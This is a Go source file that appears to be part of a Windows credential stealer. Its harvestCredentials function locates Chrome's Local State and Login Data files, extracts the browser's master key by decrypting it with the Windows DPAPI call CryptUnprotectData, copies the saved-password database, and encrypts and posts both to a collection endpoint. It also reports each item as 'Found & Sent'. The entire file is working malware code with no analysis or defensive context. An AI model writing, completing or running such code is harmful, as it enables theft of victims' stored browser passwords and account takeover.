package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"
)

func harvestCredentials() {
	userDir, err := os.UserCacheDir()
	if err != nil {
		sendErrorLog("Failed to find AppData Local")
		return
	}

	logMsg := "Harvest Report:\n"

	localStatePath := filepath.Join(userDir, "Google", "Chrome", "User Data", "Local State")
	masterKey, err := getMasterKey(localStatePath)
	if err == nil {
		res := Result{Type: "file", Filename: "master_key.bin", Data: base64.StdEncoding.EncodeToString(masterKey)}
		jsonResult, err := json.Marshal(res)
		if err == nil {
			encryptedResult, err := Encrypt(string(jsonResult))
			if err == nil {
				postResult(encryptedResult)
			} else {
				queueError("harvest_master_encrypt")
			}
		} else {
			queueError("harvest_master_marshal")
		}
		logMsg += "[+] Master Key: Found & Sent\n"
	} else {
		logMsg += fmt.Sprintf("[-] Master Key Error: %s\n", err)
	}

	loginDataPath := filepath.Join(userDir, "Google", "Chrome", "User Data", "Default", "Login Data")
	if _, err := os.Stat(loginDataPath); os.IsNotExist(err) {
		loginDataPath = filepath.Join(userDir, "Google", "Chrome", "User Data", "Profile 1", "Login Data")
	}

	if _, err := os.Stat(loginDataPath); os.IsNotExist(err) {
		logMsg += fmt.Sprintf("[-] Login DB Error: File not found at Default or Profile 1\n")
	} else {
		tempPath := filepath.Join(os.TempDir(), "db_copy.tmp")
		if err := copyFile(loginDataPath, tempPath); err == nil {
			dbData, err := os.ReadFile(tempPath)
			if err == nil {
				res := Result{Type: "file", Filename: "Login Data", Data: base64.StdEncoding.EncodeToString(dbData)}
				jsonResult, err := json.Marshal(res)
				if err == nil {
					encryptedResult, err := Encrypt(string(jsonResult))
					if err == nil {
						postResult(encryptedResult)
					} else {
						queueError("harvest_login_encrypt")
					}
				} else {
					queueError("harvest_login_marshal")
				}
			} else {
				queueError("harvest_login_read")
			}
			logMsg += "[+] Login DB: Found & Sent\n"
			os.Remove(tempPath)
		} else {
			logMsg += fmt.Sprintf("[-] Login DB Copy Error: %s\n", err)
		}
	}

	sendErrorLog(logMsg)
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

func getMasterKey(path string) ([]byte, error) {
	jsonFile, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var state LocalState
	json.Unmarshal(jsonFile, &state)
	encryptedKey, err := base64.StdEncoding.DecodeString(state.OsCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	encryptedKey = encryptedKey[5:]
	return decryptDPAPI(encryptedKey)
}

func decryptDPAPI(data []byte) ([]byte, error) {
	var outBlob DATA_BLOB
	var inBlob DATA_BLOB
	inBlob.cbData = uint32(len(data))
	inBlob.pbData = &data[0]
	ret, _, _ := procCryptUnprotectData.Call(uintptr(unsafe.Pointer(&inBlob)), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outBlob)))
	if ret == 0 {
		return nil, fmt.Errorf("decryption failed")
	}
	defer windows.LocalFree(windows.Handle(unsafe.Pointer(outBlob.pbData)))
	decrypted := make([]byte, outBlob.cbData)
	copy(decrypted, (*[1 << 30]byte)(unsafe.Pointer(outBlob.pbData))[:outBlob.cbData])
	return decrypted, nil
}
